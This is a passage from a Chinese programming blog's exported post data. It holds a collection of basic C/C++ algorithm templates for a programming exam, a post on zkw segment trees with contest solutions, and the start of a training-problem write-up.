\u0026amp;\u0026amp; s[i] \u0026lt;x) i++; if(i \u0026lt; j) s[j--] = s[i]; } s[i] = x; quick_sort(s, l, i-1); quick_sort(s, i+1, r); } } 选择排序 # void sel_sort(int *num, int n) //ascending order { int i, j, min, tmp; for (i = 0;i \u0026lt; n - 1; ++i){ min = i; for (j = i + 1; j \u0026lt; n; ++j) if (num[min] \u0026gt; num[j]) min = j; if (min != i){ tmp = num[min]; num[min] = num[i]; num[i] = tmp; } } } 插入排序 # void ins_sort(int *num, int n) //ascending order { int i, j; for (i = 1; i \u0026lt; n; ++i){ for (j = 0; j \u0026lt; i; ++j) if (num[j] \u0026gt; num[i]){ int tmp = num[i], k; for (k = i; k\u0026gt; j; --k) num[k] = num[k - 1]; num[j] = tmp; break; } } } 冒泡排序 # void bubble_sort(int *num, int n) // ascending order { int i, j; for (i = n - 1; i\u0026gt; 0; --i){ for (j = 0; j \u0026lt; i; ++j) if (num[j] \u0026gt; num[j + 1]){ int tmp = num[j]; num[j] = num[j + 1]; num[j + 1] = tmp; } } } 杨辉三角 # void tri(int m) { int i,j,a[30][30]={{0}}; for (i = 0; i \u0026lt; m; i++) a[i][0] = 1; for (i = 1; i \u0026lt; m; i++) for (j = 1; j \u0026lt;= i; j++) a[i][j] = a[i-1][j-1] + a[i-1][j]; for (i = 0; i \u0026lt; m; i++){ for (j = 0; j \u0026lt;= i; j++){ if (j == i) printf(\u0026#34;%d\u0026#34;, a[i][j]); else printf(\u0026#34;%d\u0026#34;, a[i][j]); } printf(\u0026#34;\\n\u0026#34;); } } 十进制转 R 进制 # void TentoR(int a, int b) //a(base 10) to number(base b) { int cnt,number[20]; if (a == 0) return; TentoR(a / b, b); number[cnt++] = a % b; } 二分查找 # int bin_search(int *a, int size, int p) //ascending order { int l = 0, r = size - 1; while (l \u0026lt;= r){ int mid = l + (r - l) / 2; if (p == a[mid]) return mid; else if (p\u0026gt; a[mid]) l = mid + 1; else r = mid - 1; } return -1; } 字符串反转 # void rev_str(char s[]) { int c,i,j; for (i = 0, j = strlen(s) - 1; i \u0026lt;j; i++, j--){ c = s [i]; s[i] = s[j]; s[j] = c; } } 最大公约数 # long gcd(long a, long b) //lcm = a * b / gcd(a, b) { return b == 0 ? a : gcd(b, a % b); } 高精度 # 加法（非负） # inline string add(string s1, string s2) { string s; int len1 = s1.size(), len2 = s2.size(); if (len1 \u0026lt; len2) for (int i = 1; i \u0026lt;= len2-len1; ++i) s1 = \u0026#34;0\u0026#34; + s1; else for (int i = 1; i \u0026lt;= len1-len2; ++i) s2 = \u0026#34;0\u0026#34; + s2; len1 = s1.size(); int plus = 0, tmp; for (int i = len1-1; i\u0026gt;= 0; --i) { tmp = s1[i]-\u0026#39;0\u0026#39; + s2[i]-\u0026#39;0\u0026#39; + plus; plus = tmp / 10; tmp %= 10; s = char(tmp+\u0026#39;0\u0026#39;) + s; } if (plus) s = char(plus+\u0026#39;0\u0026#39;) + s; return s; } 减法 # inline int cmp(const string\u0026amp; s1, const string\u0026amp; s2) { if (s1.size() \u0026gt; s2.size()) return 1; else if (s1.size() \u0026lt;s2.size()) return -1; else return s1.compare(s2); } inline string subtract(string s1, string s2) { string s; if (!cmp(s1, s2)) return \u0026#34;0\u0026#34;; if (cmp(s1, s2) \u0026lt;0) {putchar(\u0026#39;-\u0026#39;); swap(s1, s2);} int tmp = s1.size() - s2.size(), minus = 0; for (int i = s2.size()-1; i \u0026gt;= 0; --i) { if (s1[i+tmp] \u0026lt;s2[i]+minus) { s = char(s1[i+tmp] - s2[i] - minus + \u0026#39;0\u0026#39;+10) + s; minus = 1; } else { s = char(s1[i+tmp] - s2[i] - minus + \u0026#39;0\u0026#39;) + s; minus = 0; } } for (int i = tmp-1; i\u0026gt;= 0; --i) { if (s1[i] - minus \u0026gt;= \u0026#39;0\u0026#39;) { s = char(s1[i]-minus) + s; minus = 0; } else { s = char(s1[i] - minus + 10) + s; minus = 1; } } s.erase(0, s.find_first_not_of(\u0026#39;0\u0026#39;)); return s; } 乘法（非负，需要前面的 add) # inline string mul(string s1, string s2) { string s, stmp; int len1 = s1.size(), len2 = s2.size(); for (int i = len2-1; i\u0026gt;= 0; --i) { stmp = \u0026#34;\u0026#34;; int tmp = s2[i]-\u0026#39;0\u0026#39;, plus = 0, t = 0; if (tmp) { for (int j = 1; j \u0026lt;= len2-i-1; ++j) stmp += \u0026#34;0\u0026#34;; for (int j = len1-1; j\u0026gt;= 0; --j) { t = (tmp*(s1[j]-\u0026#39;0\u0026#39;) + plus) % 10; plus = (tmp*(s1[j]-\u0026#39;0\u0026#39;) + plus) / 10; stmp = char(t+\u0026#39;0\u0026#39;) + stmp; } if (plus) stmp = char(plus+\u0026#39;0\u0026#39;) + stmp; } s = add(s, stmp); } s.erase(0, s.find_first_not_of(\u0026#39;0\u0026#39;)); if (s.empty()) s = \u0026#34;0\u0026#34;; return s; } 阶乘 # void fact(int n) { int result[10005]; memset(result, 0, sizeof(result)); result[0] = 1; for (int i = 2; i \u0026lt;= n; ++i) { int left = 0; for (int j = 0; j \u0026lt; 10000; ++j) { result[j] = left + result[j] * i; left = result[j] / 10; result[j] %= 10; } } int k = 9999; while (!result[k]) k--; for (int i = k; i\u0026gt;= 0; --i) printf(\u0026#34;%d\u0026#34;, result[i]); printf(\u0026#34;\\n\u0026#34;); } 除法（非负，需要前面的 subtract 和 mul 且除数不能为 0） # inline void div(string s1, string s2, string\u0026amp; quot, string\u0026amp; rem) { quot = rem = \u0026#34;\u0026#34;; if (s1 ==\u0026#34;0\u0026#34;) { quot = rem = \u0026#34;0\u0026#34;; return; } int comp = cmp(s1, s2); if (comp \u0026lt; 0) { quot = \u0026#34;0\u0026#34;; rem = s1; return; }else if (!comp) { quot = \u0026#34;1\u0026#34;; rem = \u0026#34;0\u0026#34;; return; } else { int len1 = s1.size(), len2 = s2.size(); string stmp; stmp.append(s1, 0, len2-1); for (int i = len2-1; i \u0026lt; len1; ++i) { stmp += s1[i]; stmp.erase(0, stmp.find_first_not_of(\u0026#39;0\u0026#39;)); if (stmp.empty()) stmp = \u0026#34;0\u0026#34;; for (char c =\u0026#39;9\u0026#39;; c\u0026gt;= \u0026#39;0\u0026#39;; --c) { string s, tmp; s += c; tmp = mul(s2, s); if (cmp(tmp, stmp) \u0026lt;= 0) { quot += c; stmp = subtract(stmp, tmp); break; } } } rem = stmp; } quot.erase(0, quot.find_first_not_of(\u0026#39;0\u0026#39;)); if (quot.empty()) quot = \u0026#34;0\u0026#34;; } 大整数类 # struct BigInteger { static const int BASE = 1e8; static const int WIDTH = 8; vector\u0026lt;int\u0026gt; s; BigInteger(long long num = 0) {*this = num;} BigInteger operator = (long long); BigInteger operator = (const string\u0026amp;); BigInteger operator + (const BigInteger\u0026amp;) const; BigInteger operator - (const BigInteger\u0026amp;) const; BigInteger operator * (const BigInteger\u0026amp;) const; BigInteger operator / (const BigInteger\u0026amp;) const; BigInteger operator += (const BigInteger\u0026amp;); BigInteger operator -= (const BigInteger\u0026amp;); BigInteger operator *= (const BigInteger\u0026amp;); BigInteger operator /= (const BigInteger\u0026amp;); bool operator \u0026lt;(const BigInteger\u0026amp;) const; bool operator \u0026gt; (const BigInteger\u0026amp;) const; bool operator \u0026lt;= (const BigInteger\u0026amp;) const; bool operator \u0026gt;= (const BigInteger\u0026amp;) const; bool operator != (const BigInteger\u0026amp;) const; bool operator == (const BigInteger\u0026amp;) const; }; BigInteger BigInteger::operator = (long long num) // 重载 = 运算符 (数字赋值) { s.clear(); do { s.push_back(num%BASE); num /= BASE; }while (num\u0026gt; 0); return *this; } BigInteger BigInteger::operator = (const string\u0026amp; str) // 重载 = 运算符 (字符串赋值) { s.clear(); int x, len = (str.length() - 1) / WIDTH + 1; for (int i = 0; i \u0026lt; len; ++i) { int end = str.length() - i * WIDTH; int start = max(0, end-WIDTH); sscanf(str.substr(start, end-start).c_str(),\u0026#34;%d\u0026#34;, \u0026amp;x); s.push_back(x); } return *this; } BigInteger BigInteger::operator + (const BigInteger\u0026amp; b) const // 重载 + 运算符 { BigInteger c; c.s.clear(); for (int i = 0, g = 0; ; ++i) { if (!g \u0026amp;\u0026amp; i\u0026gt;= s.size() \u0026amp;\u0026amp; i\u0026gt;= b.s.size()) break; int x = g; if (i \u0026lt; s.size()) x += s[i]; if (i \u0026lt; b.s.size()) x += b.s[i]; c.s.push_back(x%BASE); g = x / BASE; } return c; } BigInteger BigInteger::operator += (const BigInteger\u0026amp; b) // 重载 += 运算符 { *this = *this + b; return *this; } bool BigInteger::operator \u0026lt;(const BigInteger\u0026amp; b) const // 重载 \u0026lt; 运算符 { if (s.size() != b.s.size()) return s.size() \u0026lt; b.s.size(); for (int i = s.size()-1; i \u0026gt;= 0; --i) if (s[i] != b.s[i]) return s[i] \u0026lt;b.s[i]; return false; } bool BigInteger::operator \u0026gt; (const BigInteger\u0026amp; b) const // 重载 \u0026gt; 运算符 { return b \u0026lt; *this; } bool BigInteger::operator \u0026lt;= (const BigInteger\u0026amp; b) const // 重载 \u0026lt;= 运算符 { return !(b \u0026lt; *this); } bool BigInteger::operator \u0026gt;= (const BigInteger\u0026amp; b) const // 重载 \u0026gt;= 运算符 { return !(*this \u0026lt; b); } bool BigInteger::operator != (const BigInteger\u0026amp; b) const // 重载!= 运算符 { return b \u0026lt; *this || *this \u0026lt; b; } bool BigInteger::operator == (const BigInteger\u0026amp; b) const // 重载 == 运算符 { return !(b \u0026lt; *this) || !(*this \u0026lt; b); } ostream\u0026amp; operator \u0026lt;\u0026lt;(ostream\u0026amp; out, const BigInteger\u0026amp; x) // 重载 \u0026lt;\u0026lt; 运算符 { out \u0026lt;\u0026lt;x.s.back(); for (int i = x.s.size()-2; i \u0026gt;= 0; --i) { char buf[20]; sprintf(buf,\u0026#34;%08d\u0026#34;, x.s[i]); for (int j = 0; j \u0026lt; strlen(buf); ++j) out \u0026lt;\u0026lt;buf[j]; } return out; } istream\u0026amp; operator \u0026gt;\u0026gt; (istream\u0026amp; in, BigInteger\u0026amp; x) // 重载 \u0026gt;\u0026gt; 运算符 { string s; if (!(in\u0026gt;\u0026gt; s)) return in; x = s; return in; } 快速幂取模 # typedef long long ll; ll pow_mod(int a, int b, int p) { ll ret = 1; while (b) { if (b\u0026amp;1) ret = (ret * a) % p; a = (a * a) % p; b \u0026gt;\u0026gt;= 1; } return ret; } 扩展欧几里得 # int extgcd(int a, int b, int \u0026amp;x, int \u0026amp;y) { if (!b) { x = 1; y = 0; return a; } int d = extgcd(b, a % b, x, y); int t = x; x = y; y = t - a / b * y; return d; } 素数相关 # 欧拉筛 # // 欧拉筛 const int maxn = 1e7+5; bool np[maxn]{true,true}; vector\u0026lt;int\u0026gt; prime; int main() { int n, m, x; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; for (int i = 2; i \u0026lt;= n; ++i) { if (!np[i]) prime.push_back(i); for (int j = 0; j \u0026lt; prime.size() \u0026amp;\u0026amp; i*prime[j] \u0026lt;= n; ++j) { np[i*prime[j]] = true; if (i % prime[j] == 0) break; } } for (int i = 1; i \u0026lt;= m; ++i) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;x); printf(\u0026#34;%s\\n\u0026#34;, np[x] ? \u0026#34;No\u0026#34; : \u0026#34;Yes\u0026#34;); } return 0; } 埃氏筛 # const int maxn = 1e6+5; bool np[maxn]{true, true}; void init() { for (int i = 2; i \u0026lt; maxn; i++) if (!np[i]) { if (i\u0026gt; maxn/i) continue; // 或用 ll 省去这一步 for (int j = i*i; j \u0026lt; maxn; j += i) np[j] = true; } } 单独判断（sqrt(n)） # typedef long long ll; inline bool isprime(ll m) { for (ll i = 2; i * i \u0026lt;= m; ++i) if (!(m % i)) return false; return true; } 区间筛 # typedef long long ll; const int maxn = 1e6+5; ll a, b; bool isp[maxn], ispsmall[maxn]; void seg_sieve() { for (ll i = 2; i*i \u0026lt;= b; ++i) ispsmall[i] = true; for (ll i = 0; i \u0026lt;= b-a; ++i) isp[i] = true; for (ll i = 2; i*i \u0026lt;= b; ++i) if (ispsmall[i]) { for (ll j = (i\u0026lt;\u0026lt;1); j*j \u0026lt;= b; j += i) ispsmall[j] = false; for (ll j = max(2LL, (a+i-1)/i) * i; j \u0026lt;= b; j += i) isp[j-a] = false; } if (a \u0026lt;= 1) isp[1-a] = false; bool flag = false; for (ll i = 0; i \u0026lt;= b-a; ++i) if (isp[i]) { if (flag) printf(\u0026#34; %lld\u0026#34;, i+a); else flag = true, printf(\u0026#34;%lld\u0026#34;, i+a); } flag ? puts(\u0026#34;\u0026#34;) : puts(\u0026#34;no prime number.\u0026#34;); } 约瑟夫 # int n, m; vector\u0026lt;int\u0026gt; v; int main() { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; if (!n \u0026amp;\u0026amp; !m) return 0; for (int i = 1; i \u0026lt;= n; ++i) v.push_back(i); int kill = 0; while (v.size() \u0026gt; 1) { kill = (kill+m-1) % v.size(); printf(\u0026#34;%d\u0026#34;, v[kill]); v.erase(v.begin()+kill); } printf(\u0026#34;%d\\n\u0026#34;, v[0]); return 0; } 组合数计算 # typedef long long ll; ll C[41][41]; void calc() { C[1][0] = C[1][1] = 1; for(int i = 2; i \u0026lt;= 40; ++i) { C[i][0] = 1; for(int j = 1; j \u0026lt;= i; ++j) C[i][j] = C[i-1][j] + C[i-1][j-1]; } } LIS（nlogn） # fill(f, f+n, INF); for (int i = 0; i \u0026lt; n; ++i) *lower_bound(f, f+n, a[i]) = a[i]; printf(\u0026#34;%d\\n\u0026#34;, lower_bound(f, f+n, INF) - f); 闰年判断 # bool is_leap(int n) { return ((n % 4 == 0 \u0026amp;\u0026amp; n % 100)|| n % 400 == 0) ? 1 : 0; } 输出给定日期是星期几 # int main() { int y, m, d; scanf(\u0026#34;%d-%d-%d\u0026#34;, \u0026amp;y, \u0026amp;m, \u0026amp;d); if (m == 1 || m == 2){ --y; m += 12; } int c = y / 100; int yy = y - c * 100; int day = yy + yy / 4 + c / 4 - 2 * c + 13 * (m + 1) / 5 + d - 1; if (y \u0026lt;= 1582 \u0026amp;\u0026amp; m \u0026lt;= 10 \u0026amp;\u0026amp; d \u0026lt;= 4) day += 3; while (day \u0026lt; 0) day += 7; day %= 7; switch(day){ case 1: printf(\u0026#34;Monday\\n\u0026#34;);break; case 2: printf(\u0026#34;Tuesday\\n\u0026#34;);break; case 3: printf(\u0026#34;Wednesday\\n\u0026#34;);break; case 4: printf(\u0026#34;Thursday\\n\u0026#34;);break; case 5: printf(\u0026#34;Friday\\n\u0026#34;);break; case 6: printf(\u0026#34;Saturday\\n\u0026#34;);break; default: printf(\u0026#34;Sunday\\n\u0026#34;); } return 0; } 巧算数学问题 # n! 首位数 # const double PI = 3.14159265358979; const double E = 2.718281828; int main() { int n,fn; double log_n_fac; while (scanf(\u0026#34;%d\u0026#34;, \u0026amp;n) != EOF){ log_n_fac = 0.5 * log10(2 * PI *(double)n) + (double)n * log10((double)n / E); log_n_fac -=(int)log_n_fac; fn = pow(10, log_n_fac);//Stirling\u0026#39;s approximation switch(n){ case 0:printf(\u0026#34;1\\n\u0026#34;);break; case 1:printf(\u0026#34;1\\n\u0026#34;);break; case 2:printf(\u0026#34;2\\n\u0026#34;);break; case 3:printf(\u0026#34;6\\n\u0026#34;);break; case 7:printf(\u0026#34;5\\n\u0026#34;);break; case 8:printf(\u0026#34;4\\n\u0026#34;);break; default:printf(\u0026#34;%d\\n\u0026#34;, fn); } } return 0; } n^n 首位数 # int main() { int n; scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); while(n != 0){ printf(\u0026#34;%d\\n\u0026#34;,(int)pow(10,n*log10(n)-(int)(n*log10(n)))); scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); } return 0; } 整数质因子分解 # int n; void solve() { int i; int m = n; for (i = 2; i \u0026lt;= n; i++){ int cnt = 0; if (m % i) continue; while (m % i == 0){ m /= i; cnt++; } printf(\u0026#34;(%d,%d)\u0026#34;, i, cnt); if (m == 1) break; } printf(\u0026#34;\\n\u0026#34;); } n! 右端的 0 的个数 # int main() { int t,i,n,m,z; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); for (i = 0; i \u0026lt; t; i++){ scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); m = 5;z = 0; while (n\u0026gt;= m){ z += n / m; m *= 5; } printf(\u0026#34;case #%d:\\n%d\\n\u0026#34;, i, z); } return 0; } 最长回文子串 # // 中心扩展法 string expand(string s, int c1, int c2) { int l = c1, r = c2; int n = s.size(); while (l\u0026gt;= 0 \u0026amp;\u0026amp; r \u0026lt;= n-1 \u0026amp;\u0026amp; s[l] == s[r]) l--, r++; return s.substr(l+1, r-l-1); } string lps(string s) { int n = s.size(); if (!n) return \u0026#34;\u0026#34;; string lungo = s.substr(0, 1); for (int i = 0; i \u0026lt; n-1; i++) { string p1 = expand(s, i, i); if (p1.size() \u0026gt; lungo.size()) lungo = p1; string p2 = expand(s, i, i+1); if (p2.size() \u0026gt; lungo.size()) lungo = p2; } return lungo; } 最大区间和 # ans = a[0]; for (i = 0; i \u0026lt; n; ++i){ if (tot\u0026gt; 0) tot += a[i]; else tot = a[i]; ans = (tot\u0026gt;ans)?tot:ans; } 小型分数模板 # struct frac { ll nume, deno; ll gcd(ll a, ll b) { a = abs(a); b = abs(b); return b ? gcd(b, a % b) : a; } void reduct() { if(!nume) { deno = 1; return; } ll g = gcd(nume, deno); nume /= g; deno /= g; return; } frac(ll a, ll b = 1) { nume = a; deno = b; (*this).reduct(); } void print() { if(deno == 1) printf(\u0026#34;%lld\\n\u0026#34;, nume); else printf(\u0026#34;%lld/%lld\\n\u0026#34;, nume, deno); } }; frac operator+(const frac\u0026amp; a, const frac\u0026amp; b) { frac ret(a.nume*b.deno + b.nume*a.deno, a.deno*b.deno); ret.reduct(); return ret; } 简单 DP # 01 背包 # for (i = 0; i \u0026lt; n; ++i) for (j = m; j\u0026gt;= w[i]; --j) dp[j] = max(dp[j], dp[j-w[i]] + c[i]); 最大上升子序列和（n^2） # for (i = 0; i \u0026lt; n; ++i) dp[i] = a[i]; nowmax = a[0]; for (i = 0; i \u0026lt; n; ++i) for (int j = 0; j \u0026lt; i; ++j) if (a[j] \u0026lt;a[i]) { dp[i] = max(dp[i], dp[j] + a[i]); nowmax = max(nowmax, dp[i]); } 整数拆分 # for (i = 1; i \u0026lt;= n; ++i) for (j = 2; j \u0026lt;= n; ++j) { dp[i][j] = dp[i][j - 1]; if (i == j) ++dp[i][j]; else if(i\u0026gt; j) dp[i][j] += dp[i - j][j]; } 拆成 2 的幂和 # for (int i = 3; i \u0026lt;= 1000000; ++i) { if (i \u0026amp; 1) dp[i] = dp[i-1] % mod; else dp[i] = (dp[i-2] + dp[i\u0026gt;\u0026gt;1]) % mod; } 拆成不重复正整数 # dp[0] = 1; for (int i = 1; i \u0026lt;= m; ++i) for (int j = n; j\u0026gt;= i; --j) dp[j] += dp[j-i]; 数塔（最小和） # for (i = 0; i \u0026lt; n; ++i) for (j = 0; j \u0026lt;= i; ++j) scanf(\u0026#34;%d\u0026#34;, \u0026amp;a[i][j]); for (i = n - 1; i\u0026gt;= 0; --i) for (j = 0; j \u0026lt;= i; ++j) dp[j] = min(dp[j], dp[j + 1]) + a[i][j]; printf(\u0026#34;%d\\n\u0026#34;, dp[0]); 数塔（最大和） # for (i = 1; i \u0026lt;= n; ++i) for (j = 1; j \u0026lt;= i; ++j){ scanf(\u0026#34;%d\u0026#34;, \u0026amp;a[i][j][0]); a[i][j][1] = a[i][j][0]; } for (j = 1; j \u0026lt;= n; ++j) maxn[n] = max(maxn[n], a[n][j][0]); for (i = n-1; i\u0026gt;= 1; --i) for (j = 1; j \u0026lt;= i; ++j){ a[i][j][0] += max(a[i+1][j][0], a[i+1][j+1][0]); maxn[i] = max(maxn[i], a[i][j][0]); a[i][j][1] += max(max(a[i+1][j][1], a[i+1][j+1][1]), maxn[i+1]); } printf(\u0026#34;%d\\n\u0026#34;, a[1][1][1]); 数塔（个位数最大和） # for (i = 0; i \u0026lt; n; ++i) for (j = 0; j \u0026lt;= i; ++j) scanf(\u0026#34;%d\u0026#34;, \u0026amp;a[i][j]); for (i = 0; i \u0026lt; n; ++i) dp[n - 1][i][a[n - 1][i] % 10] = 1; for (i = n - 2; i\u0026gt;= 0; --i) for (j = 0; j \u0026lt;= i; ++j) for (k = 0; k \u0026lt; 10; ++k) if (dp[i + 1][j][k] || dp[i + 1][j + 1][k]) dp[i][j][(k + a[i][j]) % 10] = 1; for (i = 9; i\u0026gt;= 0; --i) if (dp[0][0][i]){printf(\u0026#34;%d\\n\u0026#34;, i); break;} 装箱问题（DP） # for (i = 0; i \u0026lt; n; ++i) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;w); for (j = m; j\u0026gt;= w; --j) dp[j] = max(dp[j], dp[j-w] + w); } 装箱问题（搜索） # void dfs(int cnt, int now) { if (now\u0026gt; v) return; if (cnt == n + 1){ if (now\u0026gt; max) max = now; return; } dfs(cnt + 1, now); dfs(cnt + 1, now + a[cnt]); } 十六进制加法 # const int N = 233; struct bigNum{ int a[N]; bigNum(){ memset(a,sizeof(a),0); for (int i=0;i\u0026lt;N;i++)a[i] = 0; } void print(){ for (int i = a[0]; i\u0026gt;0; i--){ printf(\u0026#34;%X\u0026#34;,a[i]); } puts(\u0026#34;\u0026#34;); } bigNum operator + (const bigNum \u0026amp;b){ bigNum c; c.a[0] = max(a[0], b.a[0]); int x = 0; for (int i=1;i\u0026lt;=c.a[0];i++){ //printf(\u0026#34;b[i] = %d\u0026#34;, b.a[i]); x += a[i] + b.a[i]; c.a[i] = x % 16; x /= 16; } if (x) c.a[++c.a[0]] = x; return c; } }a, b; int qd(char x){ if (\u0026#39;0\u0026#39; \u0026lt;= x \u0026amp;\u0026amp; x \u0026lt;=\u0026#39;9\u0026#39;)return x -\u0026#39;0\u0026#39;; return x - 55; } bigNum jd(string st){ bigNum ans; ans.a[0] = st.length(); for (int i=1; i \u0026lt;= ans.a[0]; i++){ ans.a[i] = qd(st[ans.a[0] - i]); } return ans; } int main(){ int T;scanf(\u0026#34;%d\u0026#34;, \u0026amp;T); string st1, st2; for (int cas = 0;cas \u0026lt; T;cas++){ printf(\u0026#34;case #%d:\\n\u0026#34;, cas); cin \u0026gt;\u0026gt; st1 \u0026gt;\u0026gt; st2; a = jd(st1); b = jd(st2); bigNum c = a + b; c.print(); } return 0; } 其他 # 另外放一些 EOJ 上具有代表性的题，遇到类似的直接看提交记录就可以了：\n区间筛法——49 埃氏筛因子——3469 谦虚数 / 丑数类似——1277 查单词——3018 多项式处理——2，2845 KMP——3441 乱搞输出图形——2983 约瑟夫——1849，1982，3030 分数相关——3041，2980，2972 基础的大法师（雾）/ 剪枝 / 前缀和等等——3490 内存相关——2822 floodfill——2848 部分库函数 # int isgraph(int ch) // 是否是可打印字符 (不含空格) int isprint(int ch) // 是否是可打印字符 (含空格) int ispunct(int ch) double atan2(double y, double x) // y/x 的反正切 (弧度) int atoi(char *nptr) double strtod(char *str) int sscanf(char str, char *format) // 通过 str 格式化赋值 char strcpy(char* dest, char* src) char strcat(char* dest, char* src) char strchr(const char *s1, int c) int strcmp(const char* s1, const char* s2) // 返回 s1-s2 int strncmp(const char* s1, const char* s2, size_t maxlen) char strrev(char *s) char strstr(const char* s1, const char* s2) // s2 中第一次出现 s1 的位置 string s(cstr[, chars_len]); string s(num, c); string s(“abcd”); s.compare(“abcd”); // 0 s.compare(“dcba”); // \u0026lt; 0 s.compare(“ab”); // \u0026gt; 0 s.compare(0,2,s,2,2); // 比较 ab 和 cd \u0026lt; 0 s.assign(“nico”,5); // \u0026#39;n\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;o\u0026#39;,\u0026#39;\\0\u0026#39; s.insert(1,str); // 插入到索引前 s.replace(1,2,”nternationalizatio”); // 从 1 开始的 2 个 s.erase(13); // 从 13 开始往后全删除 s.erase(7,5); // 从 7 开始往后删 5 个 string::find 系列： 1. 搜索对象 2. [起点索引] 3. [搜索字符个数] ","date":"2018-03-10","permalink":"/posts/exam-prep/","section":"Posts","summary":"\u003cp\u003e其实差不多就是低难度 C++ 模板集合。\u003c/p\u003e","title":"程序设计能力实训 资料准备"},{"content":"","date":"2018-03-10","permalink":"/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/","section":"Tags","summary":"","title":"动态规划"},{"content":"","date":"2018-03-10","permalink":"/tags/%E9%AB%98%E7%B2%BE%E5%BA%A6/","section":"Tags","summary":"","title":"高精度"},{"content":"","date":"2018-03-10","permalink":"/tags/%E6%90%9C%E7%B4%A2/","section":"Tags","summary":"","title":"搜索"},{"content":"","date":"2018-03-10","permalink":"/categories/%E7%AE%97%E6%B3%95/","section":"Categories","summary":"","title":"算法"},{"content":"","date":"2018-03-10","permalink":"/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/","section":"Tags","summary":"","title":"字符串"},{"content":"","date":"2018-03-10","permalink":"/tags/%E6%9C%80%E5%A4%A7%E5%8C%BA%E9%97%B4%E5%92%8C/","section":"Tags","summary":"","title":"最大区间和"},{"content":"%。\n关于 zkw 线段树是啥，参见他本人的 PPT：统计的力量\n相比递归版线段树：\n优点：代码量较少、空间需求略少（实际上不需要 4 倍）、运行效率较高（非递归） 缺点：应用范围有限制。尽管可以稍加修改就支持单点更新 / 单点查询 / 区间更新 / 区间求和 / 区间 RMQ 等，但其中部分功能似乎不能同时实现 总体来说，无论是代码量还是应用范围都介于树状数组和递归版线段树之间。\n关于这个数据结构还在摸索……下面是两个栗子:\nHDU 1166 敌兵布阵 # https://cn.vjudge.net/problem/HDU-116\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;cstdio\u0026gt; #include \u0026lt;cstring\u0026gt; using namespace std; const int maxn = 5e5+5; int T[maxn\u0026lt;\u0026lt;2], n, M; inline void pushup(int x) { T[x] = T[x\u0026lt;\u0026lt;1] + T[x\u0026lt;\u0026lt;1|1]; } inline void build() { for (M = 1; M \u0026lt;= n+1; M \u0026lt;\u0026lt;= 1); for (int i = M+1; i \u0026lt;= M+n; ++i) scanf(\u0026#34;%d\u0026#34;, T+i); for (int i = M-1; i; --i) pushup(i); } inline void add(int x, int y) { for (T[x+=M] += y, x\u0026gt;\u0026gt;=1; x; x\u0026gt;\u0026gt;=1) pushup(x); } inline void sub(int x, int y) { for (T[x+=M] -= y, x\u0026gt;\u0026gt;=1; x; x\u0026gt;\u0026gt;=1) pushup(x); } inline int query(int s, int t) { int ans = 0; for (s += M-1, t += M+1; s^t^1; s\u0026gt;\u0026gt;=1, t\u0026gt;\u0026gt;=1) { if (~s\u0026amp;1) ans += T[s^1]; if (t\u0026amp;1) ans += T[t^1]; } return ans; } int main() { int t, a, b, k = 0; char op[10]; cin \u0026gt;\u0026gt; t; while (t--) { printf(\u0026#34;Case %d:\\n\u0026#34;, ++k); memset(T, 0, sizeof T); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); build(); while (~scanf(\u0026#34;%s\u0026#34;, op) \u0026amp;\u0026amp; strcmp(op,\u0026#34;End\u0026#34;)) { if (!strcmp(op,\u0026#34;Query\u0026#34;)) {scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;a, \u0026amp;b); printf(\u0026#34;%d\\n\u0026#34;, query(a,b));} else if (!strcmp(op,\u0026#34;Add\u0026#34;)) {scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;a, \u0026amp;b); add(a,b);} else {scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;a, \u0026amp;b); sub(a,b);} } } return 0; } EOJ 3389 线段树：点增加 # http://acm.ecnu.edu.cn/problem/3389/ 微坑的模板题。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define pushup(x) T[x]=T[x\u0026lt;\u0026lt;1]+T[x\u0026lt;\u0026lt;1|1] const int maxn = 500005; int n, m, M; long long T[maxn\u0026lt;\u0026lt;4]; inline void build() { for (M = 1; M \u0026lt;= n+1; M \u0026lt;\u0026lt;= 1); for (int i = M+1; i \u0026lt;= M+n; ++i) scanf(\u0026#34;%lld\u0026#34;, T+i); for (int i = M-1; i; --i) pushup(i); } inline void update(int x, int y) { for (T[x+=M] += y, x\u0026gt;\u0026gt;=1; x; x\u0026gt;\u0026gt;=1) pushup(x); } inline void query(int s, int t) { long long ans = 0; for (s += M-1, t += M+1; s^t^1; s\u0026gt;\u0026gt;=1, t\u0026gt;\u0026gt;=1) { if (~s\u0026amp;1) ans += T[s^1]; if (t\u0026amp;1) ans += T[t^1]; } printf(\u0026#34;%lld\\n\u0026#34;, ans); } int main() { int op, x, y; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); build(); scanf(\u0026#34;%d\u0026#34;, \u0026amp;m); while (m--) { scanf(\u0026#34;%d%d%d\u0026#34;, \u0026amp;op, \u0026amp;x, \u0026amp;y); (op == 1) ? update(x, y) : query(x, y); } return 0; } ","date":"2018-03-08","permalink":"/posts/zkw-tree/","section":"Posts","summary":"\u003cp\u003e%。\u003c/p\u003e","title":"zkw 线段树"},{"content":"","date":"2018-03-08","permalink":"/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91/","section":"Tags","summary":"","title":"线段树"},{"content":"记录了新生训练上遇到的一些奇怪题，主要是 Week2 遇到的。\nWeek 2 # 总体来说不好做…… 但是确实也不难。\nA # 给定正整数 n，k，求 $f(n,k)=\\sum^n_{i=1}i^k$，结果对 19260817 取模。 1 \u0026lt;= n \u0026lt;= 1e7, 0 \u0026lt;= k \u0026lt;= 1e9 时限 0.698s（？？？）\n上来用拉格朗日插值法直接 WA。。正解其实比想象的简单。先欧拉筛出素数，对素数用快速幂求出 $i^k$ 